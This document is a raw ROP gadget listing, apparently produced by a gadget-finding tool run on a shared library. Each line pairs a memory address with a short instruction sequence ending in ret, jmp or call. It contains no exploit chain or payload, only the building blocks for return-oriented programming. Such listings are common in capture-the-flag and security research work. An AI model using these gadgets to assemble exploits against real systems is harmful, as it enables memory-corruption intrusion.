0x00002aaaaac694a8 : nop ; movsb byte ptr [rdi], byte ptr [rsi] ; std ; call qword ptr [rax]
0x00002aaaaac694b0 : nop ; movsd dword ptr [rdi], dword ptr [rsi] ; std ; call qword ptr [rax]
0x00002aaaaab59993 : nop ; movsxd rax, dword ptr [r13 + rax*4] ; add rax, r13 ; jmp rax
0x00002aaaaabca34f : nop ; movzx eax, word ptr [rdi] ; mov word ptr [rsi], ax ; xor eax, eax ; ret
0x00002aaaaab404b5 : nop ; or al, byte ptr [rax] ; add rsp, 0x80 ; ret
0x00002aaaaac84db0 : nop ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac5c004 : nop ; outsb dx, byte ptr [rsi] ; int1 ; push qword ptr [rax - 0x3f000e92] ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaabe4e6f : nop ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabcae2f : nop ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1f49f : nop ; pop rbx ; ret
0x00002aaaaac69b6c : nop ; pop rdi ; cld ; jmp qword ptr [rax]
0x00002aaaaac69d84 : nop ; pop rsp ; cld ; jmp qword ptr [rax]
0x00002aaaaac74e60 : nop ; pop rsp ; jmp 0x19fe66
0x00002aaaaac69310 : nop ; pop rsp ; sti ; jmp rax
0x00002aaaaac69fac : nop ; push rbp ; cld ; call qword ptr [rax]
0x00002aaaaac69fbc : nop ; push rbx ; cld ; call qword ptr [rax]
0x00002aaaaac5c3dc : nop ; push rcx ; inc eax ; push rcx ; push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaac69f9c : nop ; push rdi ; cld ; call qword ptr [rax]
0x00002aaaaac5d970 : nop ; push rdx ; hlt ; jmp rax
0x00002aaaaac69fa4 : nop ; push rsi ; cld ; call qword ptr [rax]
0x00002aaaaac69fb4 : nop ; push rsp ; cld ; call qword ptr [rax]
0x00002aaaaaaf558f : nop ; ret
0x00002aaaaaad7f9e : nop ; ret 0x5bdb
0x00002aaaaaada690 : nop ; ret 0xf
0x00002aaaaac69aec : nop ; sbb esp, edi ; jmp rax
0x00002aaaaac6a768 : nop ; stosd dword ptr [rdi], eax ; cld ; jmp qword ptr [rax]
0x00002aaaaab5188f : nop ; sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x00002aaaaac5c6b4 : nop ; sub edx, esi ; call qword ptr [rax]
0x00002aaaaac82670 : nop ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac6a270 : nop ; test bh, ah ; jmp qword ptr [rax]
0x00002aaaaac694cc : nop ; test eax, 0xb59dfffd ; std ; call rcx
0x00002aaaaac6a058 : nop ; xchg esp, edi ; jmp qword ptr [rax]
0x00002aaaaac69a6c : nop ; xor al, 0xfc ; jmp qword ptr [rax]
0x00002aaaaac69a68 : nop ; xor bh, ah ; call qword ptr [rax + 0x20fffc34]
0x00002aaaaac17c2b : nop ; xor byte ptr [rcx], al ; add byte ptr [rax], al ; mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaac699cc : nop ; xor eax, 0x2820fffc ; cld ; jmp rax
0x00002aaaaab9bcff : nop ; xor eax, eax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab49f5f : nop ; xor eax, eax ; ret
0x00002aaaaac699c8 : nop ; xor edi, esp ; call qword ptr [rax + 0x20fffc35]
0x00002aaaaac699c4 : nop ; xor esp, edi ; call qword ptr [rax - 0x6f0003cd]
0x00002aaaaab62fef : nop ; xor rax, rax ; ret
0x00002aaaaab4cee8 : nop dword ptr [rax + rax] ; and dword ptr [rdi], 0xffffffcf ; ret
0x00002aaaaac17df8 : nop dword ptr [rax + rax] ; call rcx
0x00002aaaaab0a0d3 : nop dword ptr [rax + rax] ; fstp st(1) ; ret
0x00002aaaaac44ee8 : nop dword ptr [rax + rax] ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaac3d098 : nop dword ptr [rax + rax] ; mov byte ptr [rcx], dl ; ret
0x00002aaaaaba9d2b : nop dword ptr [rax + rax] ; mov byte ptr [rdi + 8], 2 ; xor eax, eax ; ret
0x00002aaaaab72e0b : nop dword ptr [rax + rax] ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x00002aaaaab7a178 : nop dword ptr [rax + rax] ; mov byte ptr [rdi], dh ; ret
0x00002aaaaab7b148 : nop dword ptr [rax + rax] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaac3d0c8 : nop dword ptr [rax + rax] ; mov dword ptr [rcx], edx ; ret
0x00002aaaaab7b168 : nop dword ptr [rax + rax] ; mov dword ptr [rdi - 1], edx ; ret
0x00002aaaaab72e3b : nop dword ptr [rax + rax] ; mov dword ptr [rdi], ecx ; mov rax, rdi ; ret
0x00002aaaaab7b178 : nop dword ptr [rax + rax] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab5bbeb : nop dword ptr [rax + rax] ; mov eax, 0x16 ; ret
0x00002aaaaab5cafb : nop dword ptr [rax + rax] ; mov eax, 0xffffffff ; ret
0x00002aaaaaba2e83 : nop dword ptr [rax + rax] ; mov eax, 1 ; ret
0x00002aaaaac0d33b : nop dword ptr [rax + rax] ; mov eax, 2 ; ret
0x00002aaaaabab658 : nop dword ptr [rax + rax] ; mov eax, dword ptr [rdi + 0x4c] ; ret
0x00002aaaaab4802b : nop dword ptr [rax + rax] ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab45153 : nop dword ptr [rax + rax] ; mov eax, edi ; ret
0x00002aaaaab7a1ab : nop dword ptr [rax + rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaac3d108 : nop dword ptr [rax + rax] ; mov qword ptr [rcx], rdx ; ret
0x00002aaaaab6911b : nop dword ptr [rax + rax] ; mov qword ptr [rdi + 0x38], r9 ; ret
0x00002aaaaab7b1b8 : nop dword ptr [rax + rax] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaabed76b : nop dword ptr [rax + rax] ; mov qword ptr [rsi], rdi ; xor eax, eax ; ret
0x00002aaaaabe8de3 : nop dword ptr [rax + rax] ; mov rax, qword ptr [rax + 0x30] ; ret
0x00002aaaaabda673 : nop dword ptr [rax + rax] ; mov rax, qword ptr [rax + 8] ; ret
0x00002aaaaab08eab : nop dword ptr [rax + rax] ; mov rax, rcx ; ret
0x00002aaaaab51b38 : nop dword ptr [rax + rax] ; mov rax, rdi ; ret
0x00002aaaaab7a1eb : nop dword ptr [rax + rax] ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac3d0a8 : nop dword ptr [rax + rax] ; mov word ptr [rcx], dx ; ret
0x00002aaaaab7b158 : nop dword ptr [rax + rax] ; mov word ptr [rdi], dx ; ret
0x00002aaaaab4f618 : nop dword ptr [rax + rax] ; movzx eax, byte ptr [rdx] ; ret
0x00002aaaaaaf5587 : nop dword ptr [rax + rax] ; nop ; ret
0x00002aaaaac0099b : nop dword ptr [rax + rax] ; pop rbx ; ret
0x00002aaaaab1aa33 : nop dword ptr [rax + rax] ; ret
0x00002aaaaac18213 : nop dword ptr [rax + rax] ; xor eax, eax ; add rsp, 0x38 ; ret
0x00002aaaaab0f7fb : nop dword ptr [rax + rax] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0ef03 : nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaab735c8 : nop dword ptr [rax + rax] ; xor rax, rax ; ret
0x00002aaaaab40475 : nop dword ptr [rax] ; add dword ptr [rdx + 4], 1 ; xor eax, eax ; ret
0x00002aaaaab8038c : nop dword ptr [rax] ; add rax, 1 ; ret
0x00002aaaaac48885 : nop dword ptr [rax] ; add rsp, 8 ; ret
0x00002aaaaac04a85 : nop dword ptr [rax] ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac17ab4 : nop dword ptr [rax] ; call qword ptr [rax]
0x00002aaaaac49549 : nop dword ptr [rax] ; call qword ptr [rbx]
0x00002aaaaac46e8d : nop dword ptr [rax] ; cmp dl, 1 ; jb 0x171ea1 ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab5055d : nop dword ptr [rax] ; cmp qword ptr [rdi + 0x38], 0 ; je 0x7b57a ; ret
0x00002aaaaab80c95 : nop dword ptr [rax] ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab80c85 : nop dword ptr [rax] ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab80c8d : nop dword ptr [rax] ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab72ecc : nop dword ptr [rax] ; mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaaba167c : nop dword ptr [rax] ; mov eax, 0x6e ; syscall ; ret
0x00002aaaaaba1e55 : nop dword ptr [rax] ; mov eax, 0x7e ; ret
0x00002aaaaab0b8c4 : nop dword ptr [rax] ; mov eax, 0xffffffff ; ret
0x00002aaaaab4c3ec : nop dword ptr [rax] ; mov eax, 1 ; ret
0x00002aaaaac0249d : nop dword ptr [rax] ; mov eax, 2 ; ret
0x00002aaaaac10569 : nop dword ptr [rax] ; mov eax, dword ptr [rdi + 0x28] ; ret
0x00002aaaaab9cdad : nop dword ptr [rax] ; mov eax, dword ptr [rdi] ; ret
0x00002aaaaab495fd : nop dword ptr [rax] ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab02f1d : nop dword ptr [rax] ; mov eax, edi ; and eax, 0x7f ; ret
0x00002aaaaabe13d4 : nop dword ptr [rax] ; mov edx, 0xffffffff ; mov eax, edx ; ret
0x00002aaaaaaf689d : nop dword ptr [rax] ; mov edx, 8 ; mov eax, edx ; ret
0x00002aaaaab7ae7d : nop dword ptr [rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab4bccd : nop dword ptr [rax] ; mov edx, eax ; jmp 0x76c5a
0x00002aaaaab68e64 : nop dword ptr [rax] ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac146c5 : nop dword ptr [rax] ; mov rax, -1 ; ret
0x00002aaaaabda685 : nop dword ptr [rax] ; mov rax, qword ptr [rax + 0x108] ; ret
0x00002aaaaabda67d : nop dword ptr [rax] ; mov rax, qword ptr [rax + 0x58] ; ret
0x00002aaaaaafec8c : nop dword ptr [rax] ; mov rax, qword ptr [rip + 0x39ac59] ; ret
0x00002aaaaabea87d : nop dword ptr [rax] ; mov rax, rdi ; add rsp, 8 ; ret
0x00002aaaaab6a819 : nop dword ptr [rax] ; mov rax, rdi ; ret
0x00002aaaaab58d35 : nop dword ptr [rax] ; mov rdx, qword ptr [rsp + 0x68] ; call rax
0x00002aaaaab58a2c : nop dword ptr [rax] ; mov rsi, qword ptr [rsp + 0x48] ; call rax
0x00002aaaaab6310d : nop dword ptr [rax] ; movzx eax, byte ptr [rdi] ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x00002aaaaab42ded : nop dword ptr [rax] ; or dword ptr [rdi], 0x20 ; ret
0x00002aaaaab5ac84 : nop dword ptr [rax] ; pop rbx ; mov rsi, r12 ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab590f4 : nop dword ptr [rax] ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab8e3fc : nop dword ptr [rax] ; pop rbx ; ret
0x00002aaaaabbc89c : nop dword ptr [rax] ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaab00d51 : nop dword ptr [rax] ; ret
0x00002aaaaabe5015 : nop dword ptr [rax] ; sub eax, edi ; ret
0x00002aaaaabac0cd : nop dword ptr [rax] ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab574e1 : nop dword ptr [rax] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab3fcd4 : nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaab09a6d : nop dword ptr [rax] ; xor ecx, ecx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab6ab99 : nop dword ptr [rax] ; xor rax, rax ; ret
0x00002aaaaac3d097 : nop dword ptr cs:[rax + rax] ; mov byte ptr [rcx], dl ; ret
0x00002aaaaab7a177 : nop dword ptr cs:[rax + rax] ; mov byte ptr [rdi], dh ; ret
0x00002aaaaab7b147 : nop dword ptr cs:[rax + rax] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaab7b177 : nop dword ptr cs:[rax + rax] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaaaf5586 : nop dword ptr cs:[rax + rax] ; nop ; ret
0x00002aaaaab4a8c7 : nop dword ptr cs:[rax + rax] ; ret
0x00002aaaaab7e947 : nop dword ptr cs:[rax + rax] ; xor eax, eax ; ret
0x00002aaaaac17df7 : nop word ptr [rax + rax] ; call rcx
0x00002aaaaab0a0d2 : nop word ptr [rax + rax] ; fstp st(1) ; ret
0x00002aaaaac3d0c7 : nop word ptr [rax + rax] ; mov dword ptr [rcx], edx ; ret
0x00002aaaaab5bbea : nop word ptr [rax + rax] ; mov eax, 0x16 ; ret
0x00002aaaaabf79da : nop word ptr [rax + rax] ; mov eax, 0xffffffff ; ret
0x00002aaaaac0ed9a : nop word ptr [rax + rax] ; mov eax, 1 ; ret
0x00002aaaaab4802a : nop word ptr [rax + rax] ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab7a1aa : nop word ptr [rax + rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaabed76a : nop word ptr [rax + rax] ; mov qword ptr [rsi], rdi ; xor eax, eax ; ret
0x00002aaaaabe8de2 : nop word ptr [rax + rax] ; mov rax, qword ptr [rax + 0x30] ; ret
0x00002aaaaabda672 : nop word ptr [rax + rax] ; mov rax, qword ptr [rax + 8] ; ret
0x00002aaaaab08eaa : nop word ptr [rax + rax] ; mov rax, rcx ; ret
0x00002aaaaab7b41a : nop word ptr [rax + rax] ; mov rax, rdi ; ret
0x00002aaaaac0099a : nop word ptr [rax + rax] ; pop rbx ; ret
0x00002aaaaab1aa3a : nop word ptr [rax + rax] ; ret
0x00002aaaaab0f7fa : nop word ptr [rax + rax] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0ef02 : nop word ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaab800ba : nop word ptr [rax + rax] ; xor rax, rax ; ret
0x00002aaaaab4a8c6 : nop word ptr cs:[rax + rax] ; ret
0x00002aaaaaaff691 : not byte ptr [rbx + 0x74] ; or eax, dword ptr [rbx + 0x67403fe] ; pop rbx ; ret
0x00002aaaaab93b3e : not eax ; add eax, 0x16e ; ret
0x00002aaaaac10861 : not eax ; add rsp, 8 ; shr eax, 0x1f ; ret
0x00002aaaaabab652 : not eax ; and eax, 2 ; ret
0x00002aaaaab09790 : not eax ; and eax, edx ; ret
0x00002aaaaab0af63 : not eax ; and qword ptr [rdi + rdx*8], rax ; xor eax, eax ; ret
0x00002aaaaaaf68e1 : not eax ; xor edx, edx ; add eax, 2 ; push rax ; call rbx
0x00002aaaaab0af62 : not rax ; and qword ptr [rdi + rdx*8], rax ; xor eax, eax ; ret
0x00002aaaaac73580 : or ah, 0xe9 ; call qword ptr [rsi]
0x00002aaaaac697b4 : or ah, 0xfb ; call rax
0x00002aaaaac698c5 : or ah, bh ; inc dword ptr [rax + 0xa] ; cld ; inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaac698a5 : or ah, bh ; inc dword ptr [rax - 0x7f0003f6] ; or al, 0xfc ; call qword ptr [rax]
0x00002aaaaaad7bcc : or ah, byte ptr [rbp + 0xc] ; scasd eax, dword ptr [rdi] ; xbegin 0xfffffffff8c6efd4 ; ret
0x00002aaaaac6d189 : or ah, dh ; call rsp
0x00002aaaaab3b2e3 : or al, 0 ; add byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaac1a187 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1dd99 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1a1b5 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaabd127a : or al, 0 ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaab56b3c : or al, 0 ; add byte ptr [rax], al ; mov rax, rcx ; ret
0x00002aaaaabae80a : or al, 0 ; add byte ptr [rax], al ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabb0541 : or al, 0 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5e150 : or al, 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab5dc68 : or al, 0 ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5733a : or al, 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab3b2cc : or al, 0 ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaaad544f : or al, 0 ; add eax, 0xc1c107c ; ret 0x4412
0x00002aaaaab94501 : or al, 0 ; add rax, rdi ; jmp rax
0x00002aaaaabd0b12 : or al, 0 ; add rsp, 0x30 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab1a380 : or al, 0 ; add rsp, 0x80 ; pop rbx ; ret
0x00002aaaaab635ea : or al, 0 ; cmove rax, rdx ; ret
0x00002aaaaab9971e : or al, 0 ; mov esi, edx ; movsxd rsi, dword ptr [rax + rsi*4] ; add rax, rsi ; jmp rax
0x00002aaaaab95338 : or al, 0 ; movzx eax, al ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab800f0 : or al, 0 ; ret
0x00002aaaaab69e02 : or al, 0x16 ; mov byte ptr [rsi + rdx + 1], al ; jg 0x94df9 ; ret
0x00002aaaaab5f576 : or al, 0x16 ; movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x00002aaaaab73c58 : or al, 0x16 ; test al, al ; jne 0x9ec4a ; xor eax, eax ; sub eax, ecx ; ret
0x00002aaaaab5763a : or al, 0x18 ; mov rax, r8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab574c2 : or al, 0x18 ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaab92fb5 : or al, 0x20 ; mov rdx, rax ; jmp 0xbdfc4
0x00002aaaaabfe924 : or al, 0x24 ; call r12
0x00002aaaaac82544 : or al, 0x26 ; add dword ptr [rax], eax ; movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaabe7335 : or al, 0x2b ; add byte ptr [rax + 0xf], cl ; ret
0x00002aaaaac82e44 : or al, 0x2f ; add dword ptr [rax], eax ; pop rax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaabdb97a : or al, 0x30 ; ror byte ptr [rcx], 0xf8 ; ret
0x00002aaaaab28997 : or al, 0x31 ; div dh ; ret 0x4050
0x00002aaaaac07c1b : or al, 0x31 ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac83144 : or al, 0x32 ; add dword ptr [rax], eax ; fsub st(6) ; hlt ; jmp qword ptr [rbx]
0x00002aaaaab7ffa2 : or al, 0x3b ; or al, 0xf ; test dword ptr [rcx + rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaaba0532 : or al, 0x48 ; add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0a83c : or al, 0x48 ; add esp, 0x10 ; pop rbx ; ret
0x00002aaaaaba0627 : or al, 0x48 ; add esp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabebcfb : or al, 0x48 ; add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0fb4e : or al, 0x48 ; add esp, 0x18 ; ret
0x00002aaaaab9da73 : or al, 0x48 ; add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf7683 : or al, 0x48 ; add esp, 0x28 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac17be1 : or al, 0x48 ; add esp, 0x38 ; ret
0x00002aaaaab0abe9 : or al, 0x48 ; add esp, 0x90 ; pop rbx ; ret
0x00002aaaaab45f03 : or al, 0x48 ; add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaac3d022 : or al, 0x48 ; lea ecx, dword ptr [rdx + 0xc] ; jne 0x16823b ; ret
0x00002aaaaab7ab2f : or al, 0x48 ; lea edi, dword ptr [rdi + 0xc] ; jne 0xa628b ; ret
0x00002aaaaab7c1e3 : or al, 0x48 ; lea edi, dword ptr [rdi + 0xc] ; jne 0xa7a9b ; ret
0x00002aaaaabf7461 : or al, 0x48 ; mov dword ptr [rsi], edi ; ret
0x00002aaaaab806a4 : or al, 0x48 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab9ba83 : or al, 0x5b ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab5f973 : or al, 0x5b ; pop rbp ; pop r12 ; ret
0x00002aaaaab8fa92 : or al, 0x5d ; pop r12 ; pop r14 ; ret
0x00002aaaaabe973a : or al, 0x5d ; pop r12 ; ret
0x00002aaaaac5e048 : or al, 0x66 ; cmc ; push rsp ; cmc ; call rsp
0x00002aaaaab62b68 : or al, 0x75 ; fisttp qword ptr [rax - 1] ; ret 0xff48
0x00002aaaaab416da : or al, 0x7e ; ret
0x00002aaaaaad54b3 : or al, 0x80 ; push rbx ; add al, 4 ; ret 0x6080
0x00002aaaaab7a8ac : or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab7f0a3 : or al, 0x83 ; loop 0xaa0c1 ; movsxd rsi, dword ptr [rax + rdx*4] ; add rax, rsi ; jmp rax
0x00002aaaaab7f0db : or al, 0x83 ; loopne 0xaa0f9 ; movsxd rsi, dword ptr [rcx + rax*4] ; add rcx, rsi ; jmp rcx
0x00002aaaaab20c85 : or al, 0x83 ; ret
0x00002aaaaab2655c : or al, 0x85 ; sal byte ptr [rbp + 5], 0xf6 ; ret 0x7450
0x00002aaaaab72e82 : or al, 0x88 ; add rax, r9 ; jmp rax
0x00002aaaaab68d3f : or al, 0x88 ; add rax, rcx ; jmp rax
0x00002aaaaab00e45 : or al, 0x88 ; add rcx, r8 ; jmp rcx
0x00002aaaaac78844 : or al, 0x89 ; add byte ptr [rax], al ; fdivr dword ptr [rcx - 0x13] ; jmp qword ptr [rcx]
0x00002aaaaabbba35 : or al, 0x89 ; push rsp ; ret
0x00002aaaaabed0fb : or al, 0x89 ; ret 0x6ae9
0x00002aaaaabc727e : or al, 0x8a ; add rdx, rcx ; jmp rdx
0x00002aaaaab5e1e3 : or al, 0x8a ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaab660c4 : or al, 0x8a ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaac1917f : or al, 0x8a ; pcmpeqb xmm0, xmm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac1ee7f : or al, 0x8a ; vpcmpeqb xmm0, xmm0, xmm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac2d35d : or al, 0x8b ; add r9, r11 ; jmp r9
0x00002aaaaab1cc93 : or al, 0x8b ; add rcx, r11 ; jmp rcx
0x00002aaaaac2542d : or al, 0x8b ; lea r9, qword ptr [r11 + r9] ; jmp r9
0x00002aaaaab12495 : or al, 0x8d ; push rcx ; rol byte ptr [rax - 0x6df0f506], 1 ; ret 0xb60f
0x00002aaaaabdf1b8 : or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaab08299 : or al, 0x8f ; add rcx, rdi ; jmp rcx
0x00002aaaaac4285f : or al, 0x93 ; add rcx, r11 ; jmp rcx
0x00002aaaaab7a03b : or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab81ed6 : or al, 0x97 ; test r9d, r9d ; jne 0xace9b ; mov rax, rdx ; ret
0x00002aaaaab311ef : or al, 0xa0 ; add rax, rcx ; jmp rax
0x00002aaaaac908b1 : or al, 0xa5 ; add ebp, eax ; add ebp, esi ; add al, byte ptr [rax] ; ret
0x00002aaaaac7a844 : or al, 0xa9 ; add byte ptr [rax], al ; mov byte ptr [rsi - 0x12], cl ; jmp qword ptr [rdx]
0x00002aaaaaad7bce : or al, 0xaf ; xbegin 0xfffffffff8c6efd2 ; ret
0x00002aaaaaad7bcd : or al, 0xaf ; xbegin 0xfffffffff8c6efd3 ; ret
0x00002aaaaac25431 : or al, 0xb ; jmp r9
0x00002aaaaab7a03f : or al, 0xb ; jmp rcx
0x00002aaaaac09cb8 : or al, 0xb0 ; add rax, rcx ; jmp rax
0x00002aaaaac10b07 : or al, 0xb0 ; shr rdx, 3 ; add rax, rcx ; jmp rax
0x00002aaaaac09cce : or al, 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab0b46f : or al, 0xc2 ; mov qword ptr [rdi + rax*8], rcx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac7c644 : or al, 0xc7 ; add byte ptr [rax], al ; cmp byte ptr [rdi - 0x10], al ; jmp qword ptr [rdi]
0x00002aaaaab0b473 : or al, 0xc7 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd6d98 : or al, 0xdb ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaac7de44 : or al, 0xdf ; add byte ptr [rax], al ; int1 ; call qword ptr [rdx]
0x00002aaaaab7b636 : or al, 0xe ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab3fa56 : or al, 0xe8 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret 8
0x00002aaaaab7ffa5 : or al, 0xf ; test dword ptr [rcx + rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab7ab33 : or al, 0xf ; test dword ptr [rsi + 7], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac2f8a3 : or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaab0a7a3 : or al, 0xf3 ; ret
0x00002aaaaac7f544 : or al, 0xf6 ; add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac6d691 : or al, 0xf6 ; call rsp
0x00002aaaaabf6da2 : or al, 0xf6 ; ret 0xc602
0x00002aaaaab41e2b : or al, 0xf6 ; ret 0xf04
0x00002aaaaab2b78c : or al, 0xf6 ; ret 0xf08
0x00002aaaaabd55d5 : or al, 0xf7 ; ret 0xfc07
0x00002aaaaab00391 : or al, 0xf8 ; test rcx, rcx ; je 0x2b3a1 ; call rcx
0x00002aaaaac698ad : or al, 0xfc ; call qword ptr [rax]
0x00002aaaaac698cd : or al, 0xfc ; call rax
0x00002aaaaabcac12 : or al, 1 ; add byte ptr [rax], al ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaaad5884 : or al, 1 ; add byte ptr [rax], al ; ret 0x440c
0x00002aaaaabcad02 : or al, 1 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac90344 : or al, 4 ; add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaac28b26 : or al, 4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7ad70 : or al, 5 ; add byte ptr [rax], al ; ret
0x00002aaaaab8e265 : or al, 5 ; add byte ptr [rbp + 0x29dc75db], al ; ret
0x00002aaaaab8e2b9 : or al, 5 ; add byte ptr [rbp + 0x390a74db], al ; ret
0x00002aaaaab2078c : or al, 6 ; add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab73026 : or al, 7 ; cmp ecx, edx ; je 0x9e02b ; cmp ecx, esi ; je 0x9e02b ; ret
0x00002aaaaab72f76 : or al, 7 ; test cl, cl ; jne 0x9df6f ; ret
0x00002aaaaac28d14 : or al, byte ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7193f : or al, byte ptr [rax] ; add bh, dh ; ret 0
0x00002aaaaab6bf7b : or al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaab882fd : or al, byte ptr [rax] ; add byte ptr [rax - 0x48], cl ; ret 0xffff
0x00002aaaaab0c371 : or al, byte ptr [rax] ; add byte ptr [rax - 0x73], cl ; adc byte ptr [r8 + 0x39], r9b ; ret
0x00002aaaaac1935d : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1bf71 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19381 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaaae52a0 : or al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaaae5af2 : or al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
